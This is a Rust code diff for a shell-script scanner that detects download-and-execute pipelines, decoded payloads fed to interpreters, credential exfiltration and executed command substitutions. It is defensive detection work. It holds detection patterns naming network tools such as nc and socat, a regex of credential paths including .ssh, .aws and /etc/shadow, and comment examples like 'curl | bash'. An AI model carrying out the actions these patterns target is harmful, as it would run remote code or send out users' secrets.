@@ -208,8 +208,20 @@ fn tokenize(content: &str) -> Vec<Token> {
                 finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
                 push_separator(&mut tokens);
             }
-            ';' | '{' | '}' => {
+            ';' => {
                 finish_word(&mut tokens, &mut word, &mut obfuscated, word_line);
+                push_separator(&mut tokens);
+            }
+            // Braces are grouping words only when they stand alone, so
+            // `xargs -I{}`, `curl -d {}` and `${var}` stay ordinary words.
+            '{' if word.is_empty()
+                && chars
+                    .get(i + 1)
+                    .is_none_or(|next| next.is_whitespace() || *next == ';') =>
+            {
+                push_separator(&mut tokens);
+            }
+            '}' if word.is_empty() => {
                 push_separator(&mut tokens);
             }
             '\n' => {
@@ -345,6 +357,10 @@ fn executable(tokens: &[Token]) -> Option<ResolvedCommand> {
                 }
             }
         }
+        if matches!(kind, WrapperKind::Timeout) {
+            // `timeout [OPTION] DURATION COMMAND`
+            i += 1;
+        }
     }
 }
 
@@ -409,6 +425,12 @@ enum WrapperKind {
     Nohup,
     Privilege,
     Time,
+    Nice,
+    Timeout,
+    Setsid,
+    Busybox,
+    Stdbuf,
+    Ionice,
 }
 
 fn wrapper_kind(word: &str) -> Option<WrapperKind> {
@@ -420,6 +442,12 @@ fn wrapper_kind(word: &str) -> Option<WrapperKind> {
         "nohup" => Some(WrapperKind::Nohup),
         "sudo" | "doas" => Some(WrapperKind::Privilege),
         "time" => Some(WrapperKind::Time),
+        "nice" => Some(WrapperKind::Nice),
+        "timeout" => Some(WrapperKind::Timeout),
+        "setsid" => Some(WrapperKind::Setsid),
+        "busybox" => Some(WrapperKind::Busybox),
+        "stdbuf" => Some(WrapperKind::Stdbuf),
+        "ionice" => Some(WrapperKind::Ionice),
         _ => None,
     }
 }
@@ -482,6 +510,53 @@ fn wrapper_option(kind: WrapperKind, option: &str) -> WrapperOption {
                 .iter()
                 .any(|prefix| option.starts_with(prefix)) =>
             {
+                WrapperOption::InlineValue
+            }
+            _ => WrapperOption::Unknown,
+        },
+        WrapperKind::Nice => match option {
+            "-n" | "--adjustment" => WrapperOption::Value,
+            option
+                if option.starts_with("--adjustment=")
+                    || option[1..].chars().all(|ch| ch.is_ascii_digit() || ch == '-') =>
+            {
+                WrapperOption::InlineValue
+            }
+            _ => WrapperOption::Unknown,
+        },
+        WrapperKind::Timeout => match option {
+            "-s" | "--signal" | "-k" | "--kill-after" => WrapperOption::Value,
+            "--preserve-status" | "--foreground" | "-v" | "--verbose" => WrapperOption::Boolean,
+            option
+                if option.starts_with("--signal=")
+                    || option.starts_with("--kill-after=")
+                    || option.starts_with("-s")
+                    || option.starts_with("-k") =>
+            {
+                WrapperOption::InlineValue
+            }
+            _ => WrapperOption::Unknown,
+        },
+        WrapperKind::Setsid => match option {
+            "-f" | "--fork" | "-w" | "--wait" | "-c" | "--ctty" => WrapperOption::Boolean,
+            _ => WrapperOption::Unknown,
+        },
+        WrapperKind::Busybox => WrapperOption::Unknown,
+        WrapperKind::Stdbuf => match option {
+            "-i" | "-o" | "-e" => WrapperOption::Value,
+            option
+                if ["-i", "-o", "-e", "--input=", "--output=", "--error="]
+                    .iter()
+                    .any(|prefix| option.starts_with(prefix)) =>
+            {
+                WrapperOption::InlineValue
+            }
+            _ => WrapperOption::Unknown,
+        },
+        WrapperKind::Ionice => match option {
+            "-c" | "--class" | "-n" | "--classdata" => WrapperOption::Value,
+            "-t" | "--ignore" => WrapperOption::Boolean,
+            option if option.starts_with("-c") || option.starts_with("-n") => {
                 WrapperOption::InlineValue
             }
             _ => WrapperOption::Unknown,
@@ -675,29 +750,109 @@ fn command_spans(tokens: &[Token]) -> Vec<(usize, usize)> {
     spans
 }
 
+const SHELL_INTERPRETERS: &[&str] = &["bash", "sh", "dash", "ksh", "zsh", "mksh", "ash"];
+const SCRIPT_INTERPRETERS: &[&str] = &[
+    "python", "python2", "python3", "perl", "ruby", "php", "lua", "node",
+];
+
+/// Paths that name the process's own stdin.
+const STDIN_PATHS: &[&str] = &["-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"];
+
+/// Short-option grammar for one interpreter family.
+struct InterpreterOptions {
+    /// Flags whose presence means the program comes from an argument.
+    inline: &'static str,
+    /// Flags that take a value (attached, or the next word when not attached).
+    value: &'static str,
+    /// Flags that force reading the program from stdin (`sh -s`).
+    stdin: &'static str,
+}
+
+fn interpreter_options(name: &str) -> Option<InterpreterOptions> {
+    let options = |inline, value, stdin| InterpreterOptions {
+        inline,
+        value,
+        stdin,
+    };
+    Some(match name {
+        n if SHELL_INTERPRETERS.contains(&n) => options("c", "oO", "s"),
+        "python" | "python2" | "python3" => options("cm", "WX", ""),
+        "perl" => options("eE", "IMmlx0Ci", ""),
+        "ruby" => options("e", "IEreCKFx", ""),
+        "php" => options("rRBE", "cdzfFt", ""),
+        "lua" => options("e", "lW", ""),
+        "node" => options("ep", "r", ""),
+        _ => return None,
+    })
+}
+
+/// Whether the command reads its program from stdin. Each interpreter's
+/// inline-code flags (`sh -c`, `python -c/-m`, `perl -e/-E`, `php -r`,
+/// `node -e/-p`) take the program from an argument, and option values
+/// (`bash -o pipefail`, `python -W ignore`, `ruby -E utf-8`) are skipped rather
+/// than mistaken for a script operand. `sh -s`, no operand, or a stdin path
+/// operand read the program from stdin; `source`/`.` only with a stdin path.
 fn interpreter_consumes_stdin(command: &ResolvedCommand) -> bool {
     let name = command_name(&command.executable);
-    if !matches!(
-        name,
-        "bash" | "sh" | "python" | "python2" | "python3" | "perl" | "ruby" | "php" | "lua" | "node"
-    ) {
-        return false;
+    if matches!(name, "source" | ".") {
+        return command
+            .args
+            .first()
+            .is_some_and(|operand| STDIN_PATHS.contains(&operand.value.as_str()));
     }
+    let Some(options) = interpreter_options(name) else {
+        return false;
+    };
+    let shell = SHELL_INTERPRETERS.contains(&name);
 
-    let mut options_ended = false;
-    for argument in &command.args {
-        if !options_ended && argument.value == "--" {
-            options_ended = true;
-            continue;
+    let mut i = 0;
+    while i < command.args.len() {
+        let value = command.args[i].value.as_str();
+        if value == "--" {
+            return command
+                .args
+                .get(i + 1)
+                .is_none_or(|operand| STDIN_PATHS.contains(&operand.value.as_str()));
         }
-        if !options_ended && argument.value.starts_with('-') {
-            let flags = argument.value.trim_start_matches('-');
-            if flags.contains('c') || matches!(argument.value.as_str(), "-e" | "-E" | "-r") {
+        if let Some(long) = value.strip_prefix("--") {
+            if matches!(long, "command" | "eval" | "print") {
                 return false;
             }
+            if !long.contains('=')
+                && matches!(long, "rcfile" | "init-file" | "require" | "import" | "loader")
+            {
+                i += 1;
+            }
+            i += 1;
             continue;
         }
-        return argument.value == "-";
+        let bundle = value
+            .strip_prefix('-')
+            .or_else(|| value.strip_prefix('+').filter(|_| shell));
+        let Some(bundle) = bundle.filter(|bundle| !bundle.is_empty()) else {
+            return STDIN_PATHS.contains(&value);
+        };
+        let mut skip_next = 0;
+        for (offset, flag) in bundle.char_indices() {
+            if options.inline.contains(flag) && value.starts_with('-') {
+                return false;
+            }
+            if options.stdin.contains(flag) && value.starts_with('-') {
+                return true;
+            }
+            if options.value.contains(flag) {
+                if shell {
+                    // Shells: each `o`/`O` in a bundle takes the next word.
+                    skip_next += 1;
+                    continue;
+                }
+                if bundle[offset + flag.len_utf8()..].is_empty() {
+                    skip_next = 1;
+                }
+                break;
+            }
+        }
+        i += 1 + skip_next;
     }
     true
 }
@@ -751,6 +906,8 @@ struct HeredocBody {
 struct HeredocSpec {
     delimiter: String,
     strip_tabs: bool,
+    /// Unquoted delimiter: the shell expands `$(...)` and backticks in the body.
+    expands: bool,
 }
 
 struct PendingHeredoc {
@@ -761,10 +918,19 @@ struct PendingHeredoc {
 }
 
 fn extract_heredoc_bodies(content: &str) -> (String, Vec<HeredocBody>) {
+    let (active, executed, _) = extract_heredoc_parts(content);
+    (active, executed)
+}
+
+/// Active text, heredoc bodies fed to an interpreter, and the remaining
+/// unquoted-delimiter bodies, whose command substitutions the shell still
+/// executes while expanding them.
+fn extract_heredoc_parts(content: &str) -> (String, Vec<HeredocBody>, Vec<HeredocBody>) {
     use std::collections::VecDeque;
 
     let mut active = String::with_capacity(content.len());
     let mut bodies = Vec::new();
+    let mut expanding = Vec::new();
     let mut pending = VecDeque::<PendingHeredoc>::new();
     let mut line_number = 1;
 
@@ -778,13 +944,16 @@ fn extract_heredoc_bodies(content: &str) -> (String, Vec<HeredocBody>) {
             };
             if candidate == heredoc.spec.delimiter {
                 let finished = pending.pop_front().expect("front heredoc exists");
+                let body = HeredocBody {
+                    content: finished.content,
+                    start_line: finished.start_line,
+                };
                 if finished.execute {
-                    bodies.push(HeredocBody {
-                        content: finished.content,
-                        start_line: finished.start_line,
-                    });
+                    bodies.push(body);
+                } else if finished.spec.expands {
+                    expanding.push(body);
                 }
-            } else if heredoc.execute {
+            } else if heredoc.execute || heredoc.spec.expands {
                 heredoc.content.push_str(candidate);
                 heredoc.content.push('\n');
             }
@@ -809,7 +978,7 @@ fn extract_heredoc_bodies(content: &str) -> (String, Vec<HeredocBody>) {
         line_number += 1;
     }
 
-    (active, bodies)
+    (active, bodies, expanding)
 }
 
 fn heredoc_execution_flags(header: &str) -> Vec<bool> {
@@ -939,11 +1108,12 @@ fn find_heredoc_specs(line: &str) -> Vec<HeredocSpec> {
                 while chars.get(i).is_some_and(|ch| ch.is_whitespace()) {
                     i += 1;
                 }
-                let (delimiter, next) = parse_heredoc_delimiter(&chars, i);
+                let (delimiter, next, quoted) = parse_heredoc_delimiter(&chars, i);
                 if !delimiter.is_empty() {
                     specs.push(HeredocSpec {
                         delimiter,
                         strip_tabs,
+                        expands: !quoted,
                     });
                 }
                 i = next;
@@ -956,9 +1126,10 @@ fn find_heredoc_specs(line: &str) -> Vec<HeredocSpec> {
     specs
 }
 
-fn parse_heredoc_delimiter(chars: &[char], mut i: usize) -> (String, usize) {
+fn parse_heredoc_delimiter(chars: &[char], mut i: usize) -> (String, usize, bool) {
     let mut word = String::new();
     let mut quote = None;
+    let mut quoted = false;
     while i < chars.len() {
         let ch = chars[i];
         if let Some(delimiter) = quote {
@@ -974,17 +1145,21 @@ fn parse_heredoc_delimiter(chars: &[char], mut i: usize) -> (String, usize) {
             continue;
         }
         match ch {
-            '\'' | '"' => quote = Some(ch),
+            '\'' | '"' => {
+                quote = Some(ch);
+                quoted = true;
+            }
             '\\' if i + 1 < chars.len() => {
                 i += 1;
                 word.push(chars[i]);
+                quoted = true;
             }
             ch if ch.is_whitespace() || ";&|<>".contains(ch) => break,
             _ => word.push(ch),
         }
         i += 1;
     }
-    (word, i)
+    (word, i, quoted)
 }
 
 /// Remove Bash comments while preserving line numbering and quoted `#` data.
@@ -1046,6 +1221,721 @@ pub fn strip_comments(content: &str) -> String {
     }
 
     output
+}
+
+/// Join quote and escape fragments that cannot hold prose, so `ba""sh`,
+/// `/dev/t""cp`, `n''c` and `c\url` read as the words the shell executes.
+///
+/// A quoted segment loses its delimiters only when its content has no
+/// whitespace and no shell operators, so a quoted sentence such as
+/// `echo "run curl | sh"` is left exactly as written. Line count is preserved
+/// so pattern findings still point at the original source line. This is a
+/// supplementary view for the literal pattern database, never a replacement
+/// for the raw text.
+pub fn join_quoted_fragments(content: &str) -> String {
+    let chars: Vec<char> = content.chars().collect();
+    let mut output = String::with_capacity(content.len());
+    let mut i = 0usize;
+
+    while i < chars.len() {
+        let ch = chars[i];
+        match ch {
+            '\\' if i + 1 < chars.len()
+                && (chars[i + 1].is_ascii_alphanumeric() || chars[i + 1] == '/') =>
+            {
+                output.push(chars[i + 1]);
+                i += 2;
+            }
+            '\\' if i + 1 < chars.len() => {
+                output.push(ch);
+                output.push(chars[i + 1]);
+                i += 2;
+            }
+            '\'' | '"' => {
+                let mut end = i + 1;
+                let mut inner = String::new();
+                let mut closed = false;
+                while end < chars.len() {
+                    let current = chars[end];
+                    if current == ch {
+                        closed = true;
+                        break;
+                    }
+                    if ch == '"' && current == '\\' && end + 1 < chars.len() {
+                        inner.push(chars[end + 1]);
+                        end += 2;
+                        continue;
+                    }
+                    inner.push(current);
+                    end += 1;
+                }
+                if !closed {
+                    output.extend(&chars[i..]);
+                    break;
+                }
+                let joinable = !inner.chars().any(|current| {
+                    current.is_whitespace()
+                        || matches!(current, '|' | ';' | '&' | '<' | '>' | '(' | ')')
+                });
+                if joinable {
+                    output.push_str(&inner);
+                } else {
+                    output.extend(&chars[i..=end]);
+                }
+                i = end + 1;
+            }
+            _ => {
+                output.push(ch);
+                i += 1;
+            }
+        }
+    }
+
+    output
+}
+
+// --- Pipeline composition -------------------------------------------------
+
+/// A cross-stage behaviour that no single literal pattern can see.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
+pub enum CompositionKind {
+    /// Downloader output reaches an interpreter through intermediate stages,
+    /// a privilege wrapper, or an interpreter the literal patterns omit.
+    DownloadExecute,
+    /// Encoded data is decoded straight into an interpreter.
+    DecodeExecute,
+    /// Credential material is read by, or flows into, a network sender.
+    CredentialExfiltration,
+    /// `eval`, `sh -c`, an interpreter here-string, or an interpreter
+    /// process-substitution runs a command substitution that downloads or
+    /// decodes.
+    SubstitutionExecute,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Composition {
+    pub kind: CompositionKind,
+    /// Stage names joined with `|`, for the report.
+    pub chain: String,
+    /// 1-based line in the analysed content.
+    pub line: usize,
+}
+
+const SUBSTITUTION_PLACEHOLDER: &str = "__BEWAUR_SUBST_";
+const DOWNLOADERS: &[&str] = &["curl", "wget"];
+const NETWORK_SENDERS: &[&str] = &[
+    "curl", "wget", "nc", "ncat", "netcat", "socat", "telnet", "scp",
+];
+
+static CREDENTIAL_PATH_RE: std::sync::LazyLock<regex::Regex> = std::sync::LazyLock::new(|| {
+    regex::Regex::new(
+        r"(?:^|[/~=@:])\.(?:ssh|aws|kube|gnupg|azure|password-store)(?:/|$)|(?:^|[/~=@:])\.docker/config\.json|(?:^|[/~=@:])\.config/gcloud(?:/|$)|(?:^|[/~=@:])\.(?:netrc|git-credentials)$|^/etc/g?shadow$",
+    )
+    .unwrap()
+});
+
+struct Substitution {
+    body: String,
+    start_line: usize,
+    /// `<(...)` / `>(...)` rather than `$(...)` / backticks.
+    process: bool,
+}
+
+/// Find download/decode-to-interpreter chains, credential exfiltration, and
+/// executed command substitutions. Pipelines are followed across any number
+/// of stages and into `$(...)`, backticks, process substitutions, literal
+/// `sh -c` / `eval` strings, and heredocs that feed an interpreter. At most one
+/// finding is returned per kind.
+///
+pub fn find_compositions(content: &str) -> Vec<Composition> {
+    let mut findings = Vec::new();
+    find_compositions_inner(content, 0, 0, &mut findings);
+    let mut seen = std::collections::HashSet::new();
+    findings.retain(|finding| seen.insert(finding.kind));
+    findings
+}
+
+fn find_compositions_inner(
+    content: &str,
+    depth: usize,
+    line_offset: usize,
+    findings: &mut Vec<Composition>,
+) {
+    if depth > 6 {
+        return;
+    }
+
+    let (active, heredoc_bodies, expanding_heredocs) = extract_heredoc_parts(content);
+    let (flattened, substitutions) = extract_substitutions(&active);
+    let tokens = tokenize(&flattened);
+
+    // `cat <<EOF` (unquoted) still runs the `$(...)` in its body.
+    for body in &expanding_heredocs {
+        let (_, nested) = extract_substitutions(&body.content);
+        for substitution in nested {
+            find_compositions_inner(
+                &substitution.body,
+                depth + 1,
+                line_offset
+                    + body.start_line.saturating_sub(1)
+                    + substitution.start_line.saturating_sub(1),
+                findings,
+            );
+        }
+    }
+
+    for pipeline in split_tokens(&tokens, |token| matches!(token, Token::Separator)) {
+        analyze_pipeline(pipeline, line_offset, findings);
+    }
+
+    for (start, end) in command_spans(&tokens) {
+        let span = &tokens[start..end];
+        let Some(command) = executable(span) else {
+            continue;
+        };
+        if let Some(chain) = executed_substitution(&command, span, &substitutions, depth) {
+            findings.push(Composition {
+                kind: CompositionKind::SubstitutionExecute,
+                chain,
+                line: line_offset + command.executable.line,
+            });
+        }
+        if let Some(script) = literal_shell_source(&command) {
+            find_compositions_inner(
+                &script,
+                depth + 1,
+                line_offset + command.executable.line.saturating_sub(1),
+                findings,
+            );
+        }
+    }
+
+    for substitution in substitutions {
+        find_compositions_inner(
+            &substitution.body,
+            depth + 1,
+            line_offset + substitution.start_line.saturating_sub(1),
+            findings,
+        );
+    }
+
+    for body in heredoc_bodies {
+        find_compositions_inner(
+            &body.content,
+            depth + 1,
+            line_offset + body.start_line.saturating_sub(1),
+            findings,
+        );
+    }
+}
+
+fn split_tokens(tokens: &[Token], is_boundary: impl Fn(&Token) -> bool) -> Vec<&[Token]> {
+    let mut parts = Vec::new();
+    let mut start = 0;
+    for (index, token) in tokens.iter().enumerate() {
+        if is_boundary(token) {
+            if start < index {
+                parts.push(&tokens[start..index]);
+            }
+            start = index + 1;
+        }
+    }
+    if start < tokens.len() {
+        parts.push(&tokens[start..]);
+    }
+    parts
+}
+
+struct Stage {
+    command: Option<ResolvedCommand>,
+    stdin_overridden: bool,
+    stdout_overridden: bool,
+    mentions_credential: bool,
+}
+
+impl Stage {
+    fn name(&self) -> Option<String> {
+        self.command
+            .as_ref()
+            .map(|command| command_name(&command.executable).to_ascii_lowercase())
+    }
+
+    fn label(&self) -> String {
+        self.name().unwrap_or_else(|| "?".to_string())
+    }
+
+    fn line(&self) -> usize {
+        self.command
+            .as_ref()
+            .map_or(1, |command| command.executable.line)
+    }
+
+    fn is_downloader(&self) -> bool {
+        self.name()
+            .is_some_and(|name| DOWNLOADERS.contains(&name.as_str()))
+    }
+
+    fn is_interpreter(&self) -> bool {
+        self.command
+            .as_ref()
+            .is_some_and(interpreter_consumes_stdin)
+    }
+
+    fn is_encoding_decoder(&self) -> bool {
+        self.command.as_ref().is_some_and(is_encoding_decoder)
+    }
+
+    fn is_sender(&self) -> bool {
+        let Some(command) = &self.command else {
+            return false;
+        };
+        let name = command_name(&command.executable).to_ascii_lowercase();
+        if NETWORK_SENDERS.contains(&name.as_str()) {
+            return true;
+        }
+        name == "xargs"
+            && command.args.iter().any(|argument| {
+                NETWORK_SENDERS.contains(&command_name(argument).to_ascii_lowercase().as_str())
+            })
+    }
+}
+
+fn build_stage(tokens: &[Token]) -> Stage {
+    let parsed = parse_command(tokens);
+    let command = executable(tokens);
+    let mentions_credential = tokens.iter().any(
+        |token| matches!(token, Token::Word(word) if CREDENTIAL_PATH_RE.is_match(&word.value)),
+    );
+    Stage {
+        command,
+        stdin_overridden: parsed.stdin_overridden,
+        stdout_overridden: parsed.stdout_overridden,
+        mentions_credential,
+    }
+}
+
+fn analyze_pipeline(pipeline: &[Token], line_offset: usize, findings: &mut Vec<Composition>) {
+    let stages: Vec<Stage> = split_tokens(pipeline, |token| matches!(token, Token::Pipe))
+        .into_iter()
+        .map(build_stage)
+        .collect();
+
+    // Split where a redirection breaks the data flow between two stages.
+    let mut segment_start = 0;
+    for index in 0..stages.len() {
+        let breaks_after = index + 1 == stages.len()
+            || stages[index].stdout_overridden
+            || stages[index + 1].stdin_overridden;
+        if breaks_after {
+            analyze_segment(&stages[segment_start..=index], line_offset, findings);
+            segment_start = index + 1;
+        }
+    }
+}
+
+fn chain_label(stages: &[Stage]) -> String {
+    stages
+        .iter()
+        .map(Stage::label)
+        .collect::<Vec<_>>()
+        .join("|")
+}
+
+fn analyze_segment(stages: &[Stage], line_offset: usize, findings: &mut Vec<Composition>) {
+    if let Some(downloader) = stages.iter().position(Stage::is_downloader)
+        && let Some(relative) = stages[downloader + 1..]
+            .iter()
+            .position(Stage::is_interpreter)
+    {
+        let interpreter = downloader + 1 + relative;
+        // Plain `curl | bash` also fires P-CURL-PIPE; the duplicate row is
+        // deliberate, because the regex misses `|&`, quoted `|` in URLs, and
+        // multi-line pipelines that the tokenizer handles.
+        findings.push(Composition {
+            kind: CompositionKind::DownloadExecute,
+            chain: chain_label(&stages[downloader..=interpreter]),
+            line: line_offset + stages[downloader].line(),
+        });
+    } else if let Some(decoder) = stages.iter().position(Stage::is_encoding_decoder)
+        && let Some(relative) = stages[decoder + 1..].iter().position(Stage::is_interpreter)
+    {
+        let interpreter = decoder + 1 + relative;
+        findings.push(Composition {
+            kind: CompositionKind::DecodeExecute,
+            chain: chain_label(&stages[decoder..=interpreter]),
+            line: line_offset + stages[decoder].line(),
+        });
+    }
+
+    if let Some(reader) = stages.iter().position(|stage| stage.mentions_credential)
+        && let Some(relative) = stages[reader..].iter().position(Stage::is_sender)
+    {
+        let sender = reader + relative;
+        findings.push(Composition {
+            kind: CompositionKind::CredentialExfiltration,
+            chain: chain_label(&stages[reader..=sender]),
+            line: line_offset + stages[reader].line(),
+        });
+    }
+}
+
+fn is_encoding_decoder(command: &ResolvedCommand) -> bool {
+    let name = command_name(&command.executable).to_ascii_lowercase();
+    let short_flag = |flag: char| {
+        command.args.iter().any(|argument| {
+            let value = argument.value.as_str();
+            value.len() > 1
+                && value.starts_with('-')
+                && !value.starts_with("--")
+                && value[1..].contains(flag)
+        })
+    };
+    let long_flag = |flag: &str| command.args.iter().any(|argument| argument.value == flag);
+    match name.as_str() {
+        "base64" | "base32" | "basenc" => {
+            short_flag('d') || short_flag('D') || long_flag("--decode")
+        }
+        "xxd" => short_flag('r') || long_flag("-revert"),
+        "openssl" => long_flag("-d"),
+        "uudecode" => true,
+        _ => false,
+    }
+}
+
+/// `eval "$(…)"`, `sh -c "$(…)"`, `bash <<< "$(…)"`, `bash <(…)` and
+/// `source <(…)` where the substitution downloads or decodes.
+fn executed_substitution(
+    command: &ResolvedCommand,
+    span: &[Token],
+    substitutions: &[Substitution],
+    depth: usize,
+) -> Option<String> {
+    let name = command_name(&command.executable).to_ascii_lowercase();
+    let fetching = |text: &str, process_only: bool| {
+        placeholder_indices(text).into_iter().any(|index| {
+            substitutions.get(index).is_some_and(|substitution| {
+                (!process_only || substitution.process)
+                    && fetches_or_decodes(&substitution.body, depth + 1)
+            })
+        })
+    };
+    let shell = SHELL_INTERPRETERS.contains(&name.as_str());
+    let interpreter = shell || SCRIPT_INTERPRETERS.contains(&name.as_str());
+
+    if name == "eval"
+        && command
+            .args
+            .iter()
+            .any(|argument| fetching(&argument.value, false))
+    {
+        return Some(format!("{name} $(…)"));
+    }
+
+    if shell {
+        for (index, argument) in command.args.iter().enumerate() {
+            let value = argument.value.as_str();
+            if !value.starts_with('-') {
+                break;
+            }
+            if (value == "--command" || !value.starts_with("--") && value[1..].contains('c'))
+                && command
+                    .args
+                    .get(index + 1)
+                    .is_some_and(|script| fetching(&script.value, false))
+            {
+                return Some(format!("{name} -c $(…)"));
+            }
+        }
+    }
+
+    if interpreter || matches!(name.as_str(), "source" | ".") {
+        // Here-string or process substitution supplying the program.
+        let mut here_string = false;
+        for token in span {
+            match token {
+                Token::Redirection(redirection)
+                    if redirection.fd == 0
+                        && matches!(redirection.kind, RedirectionKind::HereString) =>
+                {
+                    here_string = true;
+                }
+                Token::Word(word) if here_string => {
+                    if interpreter && fetching(&word.value, false) {
+                        return Some(format!("{name} <<< $(…)"));
+                    }
+                    here_string = false;
+                }
+                Token::Redirection(redirection)
+                    if redirection.fd == 0
+                        && matches!(redirection.kind, RedirectionKind::Input) =>
+                {
+                    // `bash < <(curl …)`
+                    if let Some(Token::Word(word)) = span
+                        .iter()
+                        .skip_while(|candidate| !std::ptr::eq(*candidate, token))
+                        .nth(1)
+                        && interpreter
+                        && fetching(&word.value, true)
+                    {
+                        return Some(format!("{name} < <(…)"));
+                    }
+                }
+                _ => {}
+            }
+        }
+        if let Some(operand) = command
+            .args
+            .iter()
+            .find(|argument| !argument.value.starts_with('-'))
+            && fetching(&operand.value, true)
+        {
+            return Some(format!("{name} <(…)"));
+        }
+    }
+
+    None
+}
+
+fn placeholder_indices(text: &str) -> Vec<usize> {
+    let mut indices = Vec::new();
+    let mut rest = text;
+    while let Some(position) = rest.find(SUBSTITUTION_PLACEHOLDER) {
+        rest = &rest[position + SUBSTITUTION_PLACEHOLDER.len()..];
+        let digits: String = rest.chars().take_while(char::is_ascii_digit).collect();
+        if let Ok(index) = digits.parse() {
+            indices.push(index);
+        }
+        rest = &rest[digits.len()..];
+    }
+    indices
+}
+
+/// Whether executing this command-substitution body downloads or decodes.
+fn fetches_or_decodes(content: &str, depth: usize) -> bool {
+    if depth > 6 {
+        return false;
+    }
+    let (active, heredoc_bodies) = extract_heredoc_bodies(content);
+    let (flattened, substitutions) = extract_substitutions(&active);
+    let tokens = tokenize(&flattened);
+    for (start, end) in command_spans(&tokens) {
+        let Some(command) = executable(&tokens[start..end]) else {
+            continue;
+        };
+        let name = command_name(&command.executable).to_ascii_lowercase();
+        if DOWNLOADERS.contains(&name.as_str()) || is_encoding_decoder(&command) {
+            return true;
+        }
+        if let Some(script) = literal_shell_source(&command)
+            && fetches_or_decodes(&script, depth + 1)
+        {
+            return true;
+        }
+    }
+    substitutions
+        .iter()
+        .any(|substitution| fetches_or_decodes(&substitution.body, depth + 1))
+        || heredoc_bodies
+            .iter()
+            .any(|body| fetches_or_decodes(&body.content, depth + 1))
+}
+
+/// Replace top-level `$(…)`, backtick, `<(…)` and `>(…)` substitutions with
+/// numbered placeholder words and return their bodies. Single-quoted text and
+/// comments are inert; substitutions inside double quotes are live. `$((…))`
+/// arithmetic is copied through unchanged. Newlines inside a substitution are
+/// re-emitted after its placeholder so the outer line count is preserved.
+fn extract_substitutions(content: &str) -> (String, Vec<Substitution>) {
+    let chars: Vec<char> = content.chars().collect();
+    let mut output = String::with_capacity(content.len());
+    let mut substitutions = Vec::new();
+    let mut in_double = false;
+    let mut at_word_start = true;
+    let mut line = 1usize;
+    let mut i = 0usize;
+
+    let emit = |output: &mut String,
+                substitutions: &mut Vec<Substitution>,
+                body: &[char],
+                start_line: usize,
+                process: bool| {
+        let body: String = body.iter().collect();
+        let newlines = body.matches('\n').count();
+        output.push_str(&format!(
+            "{SUBSTITUTION_PLACEHOLDER}{}__",
+            substitutions.len()
+        ));
+        substitutions.push(Substitution {
+            body,
+            start_line,
+            process,
+        });
+        for _ in 0..newlines {
+            output.push('\n');
+        }
+        newlines
+    };
+
+    while i < chars.len() {
+        let ch = chars[i];
+        let next = chars.get(i + 1).copied();
+
+        if ch == '\\' && next.is_some() {
+            output.push(ch);
+            output.push(chars[i + 1]);
+            if next == Some('\n') {
+                line += 1;
+            }
+            at_word_start = false;
+            i += 2;
+            continue;
+        }
+
+        if !in_double {
+            if ch == '\'' {
+                let end = chars[i + 1..]
+                    .iter()
+                    .position(|candidate| *candidate == '\'')
+                    .map_or(chars.len() - 1, |offset| i + 1 + offset);
+                for &quoted in &chars[i..=end] {
+                    if quoted == '\n' {
+                        line += 1;
+                    }
+                    output.push(quoted);
+                }
+                at_word_start = false;
+                i = end + 1;
+                continue;
+            }
+            if ch == '#' && at_word_start {
+                while i < chars.len() && chars[i] != '\n' {
+                    output.push(chars[i]);
+                    i += 1;
+                }
+                continue;
+            }
+        }
+
+        if ch == '"' {
+            in_double = !in_double;
+        }
+
+        let opens_command = ch == '$' && next == Some('(') && chars.get(i + 2) != Some(&'(');
+        let opens_process = !in_double && matches!(ch, '<' | '>') && next == Some('(');
+        if (opens_command || opens_process)
+            && let Some(close) = find_substitution_end(&chars, i + 2)
+        {
+            line += emit(
+                &mut output,
+                &mut substitutions,
+                &chars[i + 2..close],
+                line,
+                opens_process,
+            );
+            at_word_start = false;
+            i = close + 1;
+            continue;
+        }
+        if ch == '$' && next == Some('(') && chars.get(i + 2) == Some(&'(') {
+            // Arithmetic expansion: copy through the matching `))`.
+            if let Some(close) = find_substitution_end(&chars, i + 2) {
+                for &arithmetic in &chars[i..=close] {
+                    if arithmetic == '\n' {
+                        line += 1;
+                    }
+                    output.push(arithmetic);
+                }
+                i = close + 1;
+                continue;
+            }
+        }
+        if ch == '`'
+            && let Some(close) = find_backtick_end(&chars, i + 1)
+        {
+            line += emit(
+                &mut output,
+                &mut substitutions,
+                &chars[i + 1..close],
+                line,
+                false,
+            );
+            at_word_start = false;
+            i = close + 1;
+            continue;
+        }
+
+        if ch == '\n' {
+            line += 1;
+        }
+        at_word_start = ch.is_whitespace() || matches!(ch, ';' | '|' | '&' | '(' | ')');
+        output.push(ch);
+        i += 1;
+    }
+
+    (output, substitutions)
+}
+
+/// Index of the `)` closing a substitution whose body starts at `start`.
+fn find_substitution_end(chars: &[char], start: usize) -> Option<usize> {
+    let mut depth = 1usize;
+    let mut quote: Option<char> = None;
+    let mut at_word_start = true;
+    let mut i = start;
+
+    while i < chars.len() {
+        let ch = chars[i];
+        match quote {
+            Some('\'') => {
+                if ch == '\'' {
+                    quote = None;
+                }
+            }
+            Some(_) => match ch {
+                '\\' => i += 1,
+                '"' => quote = None,
+                '$' if chars.get(i + 1) == Some(&'(') => {
+                    i = find_substitution_end(chars, i + 2)?;
+                }
+                '`' => i = find_backtick_end(chars, i + 1)?,
+                _ => {}
+            },
+            None => match ch {
+                '\\' => i += 1,
+                '\'' | '"' => quote = Some(ch),
+                '#' if at_word_start => {
+                    while i + 1 < chars.len() && chars[i + 1] != '\n' {
+                        i += 1;
+                    }
+                }
+                '`' => i = find_backtick_end(chars, i + 1)?,
+                '(' => depth += 1,
+                ')' => {
+                    depth -= 1;
+                    if depth == 0 {
+                        return Some(i);
+                    }
+                }
+                _ => {}
+            },
+        }
+        at_word_start =
+            quote.is_none() && (ch.is_whitespace() || matches!(ch, ';' | '|' | '&' | '(' | ')'));
+        i += 1;
+    }
+    None
+}
+
+fn find_backtick_end(chars: &[char], start: usize) -> Option<usize> {
+    let mut i = start;
+    while i < chars.len() {
+        match chars[i] {
+            '\\' => i += 1,
+            '`' => return Some(i),
+            _ => {}
+        }
+        i += 1;
+    }
+    None
 }
 
 #[cfg(test)]
@@ -1240,4 +2130,237 @@ mod tests {
             "value=${#value}; python -c 'print(1)'\n{ \nfoo{#literal-word\n"
         );
